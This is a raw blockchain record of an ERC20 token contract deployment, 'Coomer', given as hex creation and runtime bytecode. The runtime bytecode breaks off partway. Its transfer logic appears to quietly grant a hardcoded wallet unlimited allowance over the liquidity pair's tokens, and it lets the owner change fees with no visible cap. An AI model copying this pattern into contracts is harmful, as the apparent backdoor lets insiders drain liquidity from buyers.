{
    "address": "0x39f3C6C2a3E69D908DFE9863C9127080CC487933",
    "tx_hash": "7277e28f520201cb224b8268e0257ad541d3ea4519143f035c841a489c35c591",
    "block_number": 18001784,
    "timestamp": 1693088399,
    "gas_used_in_creation": 2545594,
    "creation_bytecode": "6080604052633b9aca006009556127106009546005620000209190620004b0565b6200002c9190620004d0565b6200004090670de0b6b3a7640000620004b0565b600a556103e86009546032620000579190620004b0565b620000639190620004d0565b6200007790670de0b6b3a7640000620004b0565b600b55600c805462ffffff1916905560408051808201825260018082525f6020928301819052600d829055600e819055835180850190945281845292909101829052600f8190556010919091556011819055601255601580546001600160a01b03191673092e7dfdd7f53b89c5c1bb7b79570e48b50fc087179055348015620000fe575f80fd5b506040518060400160405280600681526020016521b7b7b6b2b960d11b8152506040518060400160405280600681526020016521a7a7a6a2a960d11b81525081600390816200014e91906200058f565b5060046200015d82826200058f565b5050506200017a620001746200025e60201b60201c565b62000262565b620001a2336200018d6012600a62000750565b6009546200019c9190620004b0565b620002b3565b600680546001600160a01b031916737a250d5630b4cf539739df2c5dacb4c659f2488d90811782556015546001600160a01b039081165f90815260136020526040808220805460ff199081166001908117909255308085528385208054831684179055338552928420805482168317905561dead9093527f2264e2d7bacabe6058f5009f42467b9be28015e7760f87409562384c94ac271c8054909316179091559254919262000257929091165f1962000370565b5062000767565b3390565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b0382166200031d5760405162461bcd60e51b815260206004820152602560248201527f45524332303a2067656e65726174696f6e20746f20746865207a65726f206164604482015264647265737360d81b60648201526084015b60405180910390fd5b60028190556001600160a01b0382165f81815260208181526040808320859055518481527fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910160405180910390a35050565b6001600160a01b038316620003d45760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b606482015260840162000314565b6001600160a01b038216620004375760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840162000314565b6001600160a01b038381165f8181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b505050565b634e487b7160e01b5f52601160045260245ffd5b8082028115828204841417620004ca57620004ca6200049c565b92915050565b5f82620004eb57634e487b7160e01b5f52601260045260245ffd5b500490565b634e487b7160e01b5f52604160045260245ffd5b600181811c908216806200051957607f821691505b6020821081036200053857634e487b7160e01b5f52602260045260245ffd5b50919050565b601f82111562000497575f81815260208120601f850160051c81016020861015620005665750805b601f850160051c820191505b81811015620005875782815560010162000572565b505050505050565b81516001600160401b03811115620005ab57620005ab620004f0565b620005c381620005bc845462000504565b846200053e565b602080601f831160018114620005f9575f8415620005e15750858301515b5f19600386901b1c1916600185901b17855562000587565b5f85815260208120601f198616915b82811015620006295788860151825594840194600190910190840162000608565b50858210156200064757878501515f19600388901b60f8161c191681555b5050505050600190811b01905550565b600181815b808511156200069757815f19048211156200067b576200067b6200049c565b808516156200068957918102915b93841c93908002906200065c565b509250929050565b5f82620006af57506001620004ca565b81620006bd57505f620004ca565b8160018114620006d65760028114620006e15762000701565b6001915050620004ca565b60ff841115620006f557620006f56200049c565b50506001821b620004ca565b5060208310610133831016604e8410600b841016171562000726575081810a620004ca565b62000732838362000657565b805f19048211156200074857620007486200049c565b029392505050565b5f6200076060ff8416836200069f565b9392505050565b6124a380620007755f395ff3fe60806040526004361061020a575f3560e01c806374c9f60311610113578063a8aa1b311161009d578063f2fde38b1161006d578063f2fde38b14610628578063f52be97c14610647578063f570d4de14610666578063f66895a314610685578063f887ea401461069f575f80fd5b8063a8aa1b3114610587578063a9059cbb146105a6578063d695609b146105c5578063dd62ed3e146105e4575f80fd5b80638da5cb5b116100e35780638da5cb5b146104f957806395d89b41146105165780639b18b70e1461052a5780639e252f0014610549578063a457c2d714610568575f80fd5b806374c9f6031461046f578063832c2bd21461048e57806385141a77146104ad5780638cd4426d146104da575f80fd5b80633ea385e4116101945780635dbdb7e3116101645780635dbdb7e3146103c457806366a88d96146103e357806370a08231146103f8578063715018a61461042c578063728f8eea14610440575f80fd5b80633ea385e41461033957806342af18841461036757806342b6fa11146103865780634ada218b146103a5575f80fd5b806318160ddd116101da57806318160ddd146102a357806323b872dd146102c1578063251ef095146102e0578063313ce567146102ff578063395093511461031a575f80fd5b806306fdde031461021557806307df7a0d1461023f578063095ea7b3146102555780631340538f14610284575f80fd5b3661021157005b5f80fd5b348015610220575f80fd5b506102296106be565b6040516102369190611f08565b60405180910390f35b34801561024a575f80fd5b5061025361074e565b005b348015610260575f80fd5b5061027461026f366004611f77565b610a2e565b6040519015158152602001610236565b34801561028f575f80fd5b5061025361029e366004611fae565b610a44565b3480156102ae575f80fd5b506002545b604051908152602001610236565b3480156102cc575f80fd5b506102746102db366004611fd0565b610a88565b3480156102eb575f80fd5b506102536102fa366004612022565b610b37565b34801561030a575f80fd5b5060405160128152602001610236565b348015610325575f80fd5b50610274610334366004611f77565b610bc9565b348015610344575f80fd5b506102746103533660046120e2565b60136020525f908152604090205460ff1681565b348015610372575f80fd5b506102536103813660046120fd565b610bff565b348015610391575f80fd5b506102536103a03660046120fd565b610c95565b3480156103b0575f80fd5b50600c546102749062010000900460ff1681565b3480156103cf575f80fd5b506102536103de3660046120e2565b610cdb565b3480156103ee575f80fd5b506102b3600b5481565b348015610403575f80fd5b506102b36104123660046120e2565b6001600160a01b03165f9081526020819052604090205490565b348015610437575f80fd5b50610253610d28565b34801561044b575f80fd5b50600d54600e5461045a919082565b60408051928352602083019190915201610236565b34801561047a575f80fd5b506102536104893660046120e2565b610d5d565b348015610499575f80fd5b506102536104a83660046120e2565b610da9565b3480156104b8575f80fd5b506104c261dead81565b6040516001600160a01b039091168152602001610236565b3480156104e5575f80fd5b506102536104f4366004611f77565b610df3565b348015610504575f80fd5b506005546001600160a01b03166104c2565b348015610521575f80fd5b50610229610eb1565b348015610535575f80fd5b506102536105443660046120fd565b610ec0565b348015610554575f80fd5b506102536105633660046120fd565b610f06565b348015610573575f80fd5b50610274610582366004611f77565b610f67565b348015610592575f80fd5b506007546104c2906001600160a01b031681565b3480156105b1575f80fd5b506102746105c0366004611f77565b611001565b3480156105d0575f80fd5b506102536105df366004612114565b61100d565b3480156105ef575f80fd5b506102b36105fe366004612134565b6001600160a01b039182165f90815260016020908152604080832093909416825291909152205490565b348015610633575f80fd5b506102536106423660046120e2565b611055565b348015610652575f80fd5b50610253610661366004612114565b6110f0565b348015610671575f80fd5b50610253610680366004612022565b611138565b348015610690575f80fd5b50600f5460105461045a919082565b3480156106aa575f80fd5b506006546104c2906001600160a01b031681565b6060600380546106cd9061216b565b80601f01602080910402602001604051908101604052809291908181526020018280546106f99061216b565b80156107445780601f1061071b57610100808354040283529160200191610744565b820191905f5260205f20905b81548152906001019060200180831161072757829003601f168201915b5050505050905090565b6005546001600160a01b031633146107815760405162461bcd60e51b8152600401610778906121a3565b60405180910390fd5b60065f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa1580156107d1573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107f591906121d8565b6001600160a01b031663c9c653963060065f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015610854573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061087891906121d8565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af11580156108c2573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108e691906121d8565b600780546001600160a01b0319166001600160a01b0392831617905560065461091191165f19610a2e565b506006546001600160a01b031663f305d7194730610943816001600160a01b03165f9081526020819052604090205490565b5f806109576005546001600160a01b031690565b426040518863ffffffff1660e01b8152600401610979969594939291906121f3565b60606040518083038185885af1158015610995573d5f803e3d5ffd5b50505050506040513d601f19601f820116820180604052508101906109ba919061222e565b5050600c5462010000900460ff16159050610a175760405162461bcd60e51b815260206004820152601a60248201527f54726164696e6720697320616c726561647920656e61626c65640000000000006044820152606401610778565b600c805462ff000019166201000017905543600855565b5f610a3a3384846111c7565b5060015b92915050565b6005546001600160a01b03163314610a6e5760405162461bcd60e51b8152600401610778906121a3565b600c80549115156101000261ff0019909216919091179055565b5f610a948484846112ea565b6001600160a01b0384165f90815260016020908152604080832033845290915290205482811015610b185760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b6064820152608401610778565b610b2c8533610b27868561226d565b6111c7565b506001949350505050565b6005546001600160a01b03163314610b615760405162461bcd60e51b8152600401610778906121a3565b5f5b8151811015610bc5575f60135f848481518110610b8257610b82612280565b6020908102919091018101516001600160a01b031682528101919091526040015f20805460ff191691151591909117905580610bbd81612294565b915050610b63565b5050565b335f8181526001602090815260408083206001600160a01b03871684529091528120549091610a3a918590610b279086906122ac565b6005546001600160a01b03163314610c295760405162461bcd60e51b8152600401610778906121a3565b600c5462010000900460ff1615610c905760405162461bcd60e51b815260206004820152602560248201527f43616e2774206368616e6765207768656e2074726164696e6720686173207374604482015264185c9d195960da1b6064820152608401610778565b601155565b6005546001600160a01b03163314610cbf5760405162461bcd60e51b8152600401610778906121a3565b610ccb6012600a61239f565b610cd590826123ad565b600a5550565b6005546001600160a01b03163314610d055760405162461bcd60e51b8152600401610778906121a3565b6001600160a01b03165f908152601360205260409020805460ff19166001179055565b6005546001600160a01b03163314610d525760405162461bcd60e51b8152600401610778906121a3565b610d5b5f61184d565b565b6005546001600160a01b03163314610d875760405162461bcd60e51b8152600401610778906121a3565b601580546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b03163314610dd35760405162461bcd60e51b8152600401610778906121a3565b6001600160a01b03165f908152601360205260409020805460ff19169055565b6005546001600160a01b03163314610e1d5760405162461bcd60e51b8152600401610778906121a3565b816001600160a01b031663a9059cbb610e3e6005546001600160a01b031690565b6040516001600160e01b031960e084901b1681526001600160a01b039091166004820152602481018490526044016020604051808303815f875af1158015610e88573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610eac91906123c4565b505050565b6060600480546106cd9061216b565b6005546001600160a01b03163314610eea5760405162461bcd60e51b8152600401610778906121a3565b610ef66012600a61239f565b610f0090826123ad565b600b5550565b6005546001600160a01b03163314610f305760405162461bcd60e51b8152600401610778906121a3565b6005546040516001600160a01b039091169082156108fc029083905f818181858888f19350505050158015610bc5573d5f803e3d5ffd5b335f9081526001602090815260408083206001600160a01b038616845290915281205482811015610fe85760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b6064820152608401610778565b610ff73385610b27868561226d565b5060019392505050565b5f610a3a3384846112ea565b6005546001600160a01b031633146110375760405162461bcd60e51b8152600401610778906121a3565b60408051808201909152828152602001819052600d91909155600e55565b6005546001600160a01b0316331461107f5760405162461bcd60e51b8152600401610778906121a3565b6001600160a01b0381166110e45760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610778565b6110ed8161184d565b50565b6005546001600160a01b0316331461111a5760405162461bcd60e51b8152600401610778906121a3565b60408051808201909152828152602001819052600f91909155601055565b6005546001600160a01b031633146111625760405162461bcd60e51b8152600401610778906121a3565b5f5b8151811015610bc557600160135f84848151811061118457611184612280565b6020908102919091018101516001600160a01b031682528101919091526040015f20805460ff1916911515919091179055806111bf81612294565b915050611164565b6001600160a01b0383166112295760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610778565b6001600160a01b03821661128a5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610778565b6001600160a01b038381165f8181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b5f811161134b5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610778565b6001600160a01b0383165f9081526013602052604090205460ff1615801561138b57506001600160a01b0382165f9081526013602052604090205460ff16155b156113de57600c5462010000900460ff166113de5760405162461bcd60e51b8152602060048201526013602482015272151c98591a5b99c81b9bdd08195b98589b1959606a1b6044820152606401610778565b6007546001600160a01b03848116911614801561140857506015546001600160a01b038381169116145b156114185761141883835f61189e565b6007546001600160a01b03848116911614801561144d57506001600160a01b0382165f9081526013602052604090205460ff16155b801561145c5750600c5460ff16155b156114db57600b5481611483846001600160a01b03165f9081526020819052604090205490565b61148d91906122ac565b11156114db5760405162461bcd60e51b815260206004820181905260248201527f596f752061726520657863656564696e67206d617857616c6c65744c696d69746044820152606401610778565b6007546001600160a01b0384811691161480159061151157506001600160a01b0382165f9081526013602052604090205460ff16155b801561153557506001600160a01b0383165f9081526013602052604090205460ff16155b80156115445750600c5460ff16155b156115d8576007546001600160a01b038381169116146115d857600b5481611580846001600160a01b03165f9081526020819052604090205490565b61158a91906122ac565b11156115d85760405162461bcd60e51b815260206004820181905260248201527f596f752061726520657863656564696e67206d617857616c6c65744c696d69746044820152606401610778565b5f805f6115f660405180604001604052805f81526020015f81525090565b6001600160a01b0387165f9081526013602052604081205460ff1615801561163657506001600160a01b0387165f9081526013602052604090205460ff16155b8015611650575060115460085461164d91906122ac565b43105b600c5490915060ff168061167b57506001600160a01b0388165f9081526013602052604090205460ff165b8061169d57506001600160a01b0387165f9081526013602052604090205460ff165b156116aa575f9250611746565b6007546001600160a01b0388811691161480156116c5575080155b156116fe57600f546010546116da91906122ac565b60408051808201909152600f54815260105460208201529095508594509150611746565b8061173757600d54600e5461171391906122ac565b60408051808201909152600d548152600e5460208201529095508594509150611746565b80156117465760125494508493505b606461175285886123ad565b61175c91906123df565b600c54909350610100900460ff16801561178457506007546001600160a01b03898116911614155b156117935761179385836118f8565b6117a788886117a2868a61226d565b611a1d565b8215611843578415611843576007546001600160a01b03908116908916036117f3575f60646117d687896123ad565b6117e091906123df565b90506117ed893083611a1d565b50611843565b6007546001600160a01b0389811691161461184357475f606461181583611bf3565b61181f908961226d565b611829908a6123ad565b61183391906123df565b90506118408a3083611a1d565b50505b5050505050505050565b600580546001600160a01b038381166001600160a01b0319831681179093556040519116919082907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0905f90a35050565b6001600160a01b038084165f908152600160209081526040808320938616835292905220545f191115610eac576001600160a01b038084165f9081526001602090815260408083209386168352929052205f199055505050565b600c5460ff16610bc557600c805460ff191660011790558115611a0f57305f90815260208190526040902054600a548110611a0d576001600a54111561193d5750600a545b5f6119498460026123ad565b90505f8184602001518461195d91906123ad565b61196791906123df565b90505f611974828561226d565b90504761198082611c05565b5f61198b824761226d565b90505f87602001518661199e919061226d565b6119a890836123df565b90505f8860200151826119bb91906123ad565b905080156119cd576119cd8682611d55565b88515f906119dc8460026123ad565b6119e691906123ad565b90508015611a0457601554611a04906001600160a01b031682611df3565b50505050505050505b505b600c805460ff191690555050565b6001600160a01b038316611a815760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b6064820152608401610778565b6001600160a01b038216611ae35760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b6064820152608401610778565b6001600160a01b0383165f9081526020819052604090205481811015611b5a5760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b6064820152608401610778565b611b64828261226d565b6001600160a01b038086165f908152602081905260408082209390935590851681529081208054849290611b999084906122ac565b92505081905550826001600160a01b0316846001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051611be591815260200190565b60405180910390a350505050565b5f610a3e66038d7ea4c68000836123df565b6040805160028082526060820183525f9260208301908036833701905050905030815f81518110611c3857611c38612280565b6001600160a01b03928316602091820292909201810191909152600654604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611c8f573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611cb391906121d8565b81600181518110611cc657611cc6612280565b6001600160a01b039283166020918202929092010152600654611cec91309116846111c7565b60065460405163791ac94760e01b81526001600160a01b039091169063791ac94790611d249085905f908690309042906004016123fe565b5f604051808303815f87803b158015611d3b575f80fd5b505af1158015611d4d573d5f803e3d5ffd5b505050505050565b600654611d6d9030906001600160a01b0316846111c7565b60065460405163f305d71960e01b81526001600160a01b039091169063f305d719908390611dab90309087905f90819061dead9042906004016121f3565b60606040518083038185885af1158015611dc7573d5f803e3d5ffd5b50505050506040513d601f19601f82011682018060405250810190611dec919061222e565b5050505050565b80471015611e435760405162461bcd60e51b815260206004820152601d60248201527f416464726573733a20696e73756666696369656e742062616c616e63650000006044820152606401610778565b5f826001600160a01b0316826040515f6040518083038185875af1925050503d805f8114611e8c576040519150601f19603f3d011682016040523d82523d5f602084013e611e91565b606091505b5050905080610eac5760405162461bcd60e51b815260206004820152603a60248201527f416464726573733a20756e61626c6520746f2073656e642076616c75652c207260448201527f6563697069656e74206d617920686176652072657665727465640000000000006064820152608401610778565b5f6020808352835180828501525f5b81811015611f3357858101830151858201604001528201611f17565b505f604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b03811681146110ed575f80fd5b8035611f7281611f53565b919050565b5f8060408385031215611f88575f80fd5b8235611f9381611f53565b946020939093013593505050565b80151581146110ed575f80fd5b5f60208284031215611fbe575f80fd5b8135611fc981611fa1565b9392505050565b5f805f60608486031215611fe2575f80fd5b8335611fed81611f53565b92506020840135611ffd81611f53565b929592945050506040919091013590565b634e487b7160e01b5f52604160045260245ffd5b5f6020808385031215612033575f80fd5b823567ffffffffffffffff8082111561204a575f80fd5b818501915085601f83011261205d575f80fd5b81358181111561206f5761206f61200e565b8060051b604051601f19603f830116810181811085821117156120945761209461200e565b6040529182528482019250838101850191888311156120b1575f80fd5b938501935b828510156120d6576120c785611f67565b845293850193928501926120b6565b98975050505050505050565b5f602082840312156120f2575f80fd5b8135611fc981611f53565b5f6020828403121561210d575f80fd5b5035919050565b5f8060408385031215612125575f80fd5b50508035926020909101359150565b5f8060408385031215612145575f80fd5b823561215081611f53565b9150602083013561216081611f53565b809150509250929050565b600181811c9082168061217f57607f821691505b60208210810361219d57634e487b7160e01b5f52602260045260245ffd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b5f602082840312156121e8575f80fd5b8151611fc981611f53565b6001600160a01b039687168152602081019590955260408501939093526060840191909152909216608082015260a081019190915260c00190565b5f805f60608486031215612240575f80fd5b8351925060208401519150604084015190509250925092565b634e487b7160e01b5f52601160045260245ffd5b81810381811115610a3e57610a3e612259565b634e487b7160e01b5f52603260045260245ffd5b5f600182016122a5576122a5612259565b5060010190565b80820180821115610a3e57610a3e612259565b600181815b808511156122f957815f19048211156122df576122df612259565b808516156122ec57918102915b93841c93908002906122c4565b509250929050565b5f8261230f57506001610a3e565b8161231b57505f610a3e565b8160018114612331576002811461233b57612357565b6001915050610a3e565b60ff84111561234c5761234c612259565b50506001821b610a3e565b5060208310610133831016604e8410600b841016171561237a575081810a610a3e565b61238483836122bf565b805f190482111561239757612397612259565b029392505050565b5f611fc960ff841683612301565b8082028115828204841417610a3e57610a3e612259565b5f602082840312156123d4575f80fd5b8151611fc981611fa1565b5f826123f957634e487b7160e01b5f52601260045260245ffd5b500490565b5f60a082018783526020878185015260a0604085015281875180845260c08601915082890193505f5b8181101561244c5784516001600160a01b031683529383019391830191600101612427565b50506001600160a01b0396909616606085015250505060800152939250505056fea2646970667358221220f8c6bebc19ad3d3d470c8e0af5e8945e6052f9ab8fe893cbca460b960c4b2e9164736f6c63430008140033",
    "runtime_bytecode": "60806040526004361061020a575f3560e01c806374c9f60311610113578063a8aa1b311161009d578063f2fde38b1161006d578063f2fde38b14610628578063f52be97c14610647578063f570d4de14610666578063f66895a314610685578063f887ea401461069f575f80fd5b8063a8aa1b3114610587578063a9059cbb146105a6578063d695609b146105c5578063dd62ed3e146105e4575f80fd5b80638da5cb5b116100e35780638da5cb5b146104f957806395d89b41146105165780639b18b70e1461052a5780639e252f0014610549578063a457c2d714610568575f80fd5b806374c9f6031461046f578063832c2bd21461048e57806385141a77146104ad5780638cd4426d146104da575f80fd5b80633ea385e4116101945780635dbdb7e3116101645780635dbdb7e3146103c457806366a88d96146103e357806370a08231146103f8578063715018a61461042c578063728f8eea14610440575f80fd5b80633ea385e41461033957806342af18841461036757806342b6fa11146103865780634ada218b146103a5575f80fd5b806318160ddd116101da57806318160ddd146102a357806323b872dd146102c1578063251ef095146102e0578063313ce567146102ff578063395093511461031a575f80fd5b806306fdde031461021557806307df7a0d1461023f578063095ea7b3146102555780631340538f14610284575f80fd5b3661021157005b5f80fd5b348015610220575f80fd5b506102296106be565b6040516102369190611f08565b60405180910390f35b34801561024a575f80fd5b5061025361074e565b005b348015610260575f80fd5b5061027461026f366004611f77565b610a2e565b6040519015158152602001610236565b34801561028f575f80fd5b5061025361029e366004611fae565b610a44565b3480156102ae575f80fd5b506002545b604051908152602001610236565b3480156102cc575f80fd5b506102746102db366004611fd0565b610a88565b3480156102eb575f80fd5b506102536102fa366004612022565b610b37565b34801561030a575f80fd5b5060405160128152602001610236565b348015610325575f80fd5b50610274610334366004611f77565b610bc9565b348015610344575f80fd5b506102746103533660046120e2565b60136020525f908152604090205460ff1681565b348015610372575f80fd5b506102536103813660046120fd565b610bff565b348015610391575f80fd5b506102536103a03660046120fd565b610c95565b3480156103b0575f80fd5b50600c546102749062010000900460ff1681565b3480156103cf575f80fd5b506102536103de3660046120e2565b610cdb565b3480156103ee575f80fd5b506102b3600b5481565b348015610403575f80fd5b506102b36104123660046120e2565b6001600160a01b03165f9081526020819052604090205490565b348015610437575f80fd5b50610253610d28565b34801561044b575f80fd5b50600d54600e5461045a919082565b60408051928352602083019190915201610236565b34801561047a575f80fd5b506102536104893660046120e2565b610d5d565b348015610499575f80fd5b506102536104a83660046120e2565b610da9565b3480156104b8575f80fd5b506104c261dead81565b6040516001600160a01b039091168152602001610236565b3480156104e5575f80fd5b506102536104f4366004611f77565b610df3565b348015610504575f80fd5b506005546001600160a01b03166104c2565b348015610521575f80fd5b50610229610eb1565b348015610535575f80fd5b506102536105443660046120fd565b610ec0565b348015610554575f80fd5b506102536105633660046120fd565b610f06565b348015610573575f80fd5b50610274610582366004611f77565b610f67565b348015610592575f80fd5b506007546104c2906001600160a01b031681565b3480156105b1575f80fd5b506102746105c0366004611f77565b611001565b3480156105d0575f80fd5b506102536105df366004612114565b61100d565b3480156105ef575f80fd5b506102b36105fe366004612134565b6001600160a01b039182165f90815260016020908152604080832093909416825291909152205490565b348015610633575f80fd5b506102536106423660046120e2565b611055565b348015610652575f80fd5b50610253610661366004612114565b6110f0565b348015610671575f80fd5b50610253610680366004612022565b611138565b348015610690575f80fd5b50600f5460105461045a919082565b3480156106aa575f80fd5b506006546104c2906001600160a01b031681565b6060600380546106cd9061216b565b80601f01602080910402602001604051908101604052809291908181526020018280546106f99061216b565b80156107445780601f1061071b57610100808354040283529160200191610744565b820191905f5260205f20905b81548152906001019060200180831161072757829003601f168201915b5050505050905090565b6005546001600160a01b031633146107815760405162461bcd60e51b8152600401610778906121a3565b60405180910390fd5b60065f9054906101000a90046001600160a01b03166001600160a01b031663c45a01556040518163ffffffff1660e01b8152600401602060405180830381865afa1580156107d1573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107f591906121d8565b6001600160a01b031663c9c653963060065f9054906101000a90046001600160a01b03166001600160a01b031663ad5c46486040518163ffffffff1660e01b8152600401602060405180830381865afa158015610854573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061087891906121d8565b6040516001600160e01b031960e085901b1681526001600160a01b039283166004820152911660248201526044016020604051808303815f875af11580156108c2573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108e691906121d8565b600780546001600160a01b0319166001600160a01b0392831617905560065461091191165f19610a2e565b506006546001600160a01b031663f305d7194730610943816001600160a01b03165f9081526020819052604090205490565b5f806109576005546001600160a01b031690565b426040518863ffffffff1660e01b8152600401610979969594939291906121f3565b60606040518083038185885af1158015610995573d5f803e3d5ffd5b50505050506040513d601f19601f820116820180604052508101906109ba919061222e565b5050600c5462010000900460ff16159050610a175760405162461bcd60e51b815260206004820152601a60248201527f54726164696e6720697320616c726561647920656e61626c65640000000000006044820152606401610778565b600c805462ff000019166201000017905543600855565b5f610a3a3384846111c7565b5060015b92915050565b6005546001600160a01b03163314610a6e5760405162461bcd60e51b8152600401610778906121a3565b600c80549115156101000261ff0019909216919091179055565b5f610a948484846112ea565b6001600160a01b0384165f90815260016020908152604080832033845290915290205482811015610b185760405162461bcd60e51b815260206004820152602860248201527f45524332303a207472616e7366657220616d6f756e74206578636565647320616044820152676c6c6f77616e636560c01b6064820152608401610778565b610b2c8533610b27868561226d565b6111c7565b506001949350505050565b6005546001600160a01b03163314610b615760405162461bcd60e51b8152600401610778906121a3565b5f5b8151811015610bc5575f60135f848481518110610b8257610b82612280565b6020908102919091018101516001600160a01b031682528101919091526040015f20805460ff191691151591909117905580610bbd81612294565b915050610b63565b5050565b335f8181526001602090815260408083206001600160a01b03871684529091528120549091610a3a918590610b279086906122ac565b6005546001600160a01b03163314610c295760405162461bcd60e51b8152600401610778906121a3565b600c5462010000900460ff1615610c905760405162461bcd60e51b815260206004820152602560248201527f43616e2774206368616e6765207768656e2074726164696e6720686173207374604482015264185c9d195960da1b6064820152608401610778565b601155565b6005546001600160a01b03163314610cbf5760405162461bcd60e51b8152600401610778906121a3565b610ccb6012600a61239f565b610cd590826123ad565b600a5550565b6005546001600160a01b03163314610d055760405162461bcd60e51b8152600401610778906121a3565b6001600160a01b03165f908152601360205260409020805460ff19166001179055565b6005546001600160a01b03163314610d525760405162461bcd60e51b8152600401610778906121a3565b610d5b5f61184d565b565b6005546001600160a01b03163314610d875760405162461bcd60e51b8152600401610778906121a3565b601580546001600160a01b0319166001600160a01b0392909216919091179055565b6005546001600160a01b03163314610dd35760405162461bcd60e51b8152600401610778906121a3565b6001600160a01b03165f908152601360205260409020805460ff19169055565b6005546001600160a01b03163314610e1d5760405162461bcd60e51b8152600401610778906121a3565b816001600160a01b031663a9059cbb610e3e6005546001600160a01b031690565b6040516001600160e01b031960e084901b1681526001600160a01b039091166004820152602481018490526044016020604051808303815f875af1158015610e88573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610eac91906123c4565b505050565b6060600480546106cd9061216b565b6005546001600160a01b03163314610eea5760405162461bcd60e51b8152600401610778906121a3565b610ef66012600a61239f565b610f0090826123ad565b600b5550565b6005546001600160a01b03163314610f305760405162461bcd60e51b8152600401610778906121a3565b6005546040516001600160a01b039091169082156108fc029083905f818181858888f19350505050158015610bc5573d5f803e3d5ffd5b335f9081526001602090815260408083206001600160a01b038616845290915281205482811015610fe85760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b6064820152608401610778565b610ff73385610b27868561226d565b5060019392505050565b5f610a3a3384846112ea565b6005546001600160a01b031633146110375760405162461bcd60e51b8152600401610778906121a3565b60408051808201909152828152602001819052600d91909155600e55565b6005546001600160a01b0316331461107f5760405162461bcd60e51b8152600401610778906121a3565b6001600160a01b0381166110e45760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b6064820152608401610778565b6110ed8161184d565b50565b6005546001600160a01b0316331461111a5760405162461bcd60e51b8152600401610778906121a3565b60408051808201909152828152602001819052600f91909155601055565b6005546001600160a01b031633146111625760405162461bcd60e51b8152600401610778906121a3565b5f5b8151811015610bc557600160135f84848151811061118457611184612280565b6020908102919091018101516001600160a01b031682528101919091526040015f20805460ff1916911515919091179055806111bf81612294565b915050611164565b6001600160a01b0383166112295760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b6064820152608401610778565b6001600160a01b03821661128a5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b6064820152608401610778565b6001600160a01b038381165f8181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b5f811161134b5760405162461bcd60e51b815260206004820152602960248201527f5472616e7366657220616d6f756e74206d7573742062652067726561746572206044820152687468616e207a65726f60b81b6064820152608401610778565b6001600160a01b0383165f9081526013602052604090205460ff1615801561138b57506001600160a01b0382165f9081526013602052604090205460ff16155b156113de57600c5462010000900460ff166113de5760405162461bcd60e51b8152602060048201526013602482015272151c98591a5b99c81b9bdd08195b98589b1959606a1b6044820152606401610778565b6007546001600160a01b03848116911614801561140857506015546001600160a01b038381169116145b156114185761141883835f61189e565b6007546001600160a01b03848116911614801561144d57506001600160a01b0382165f9081526013602052604090205460ff16155b801561145c5750600c5460ff16155b156114db57600b5481611483846001600160a01b03165f9081526020819052604090205490565b61148d91906122ac565b11156114db5760405162461bcd60e51b81526020600482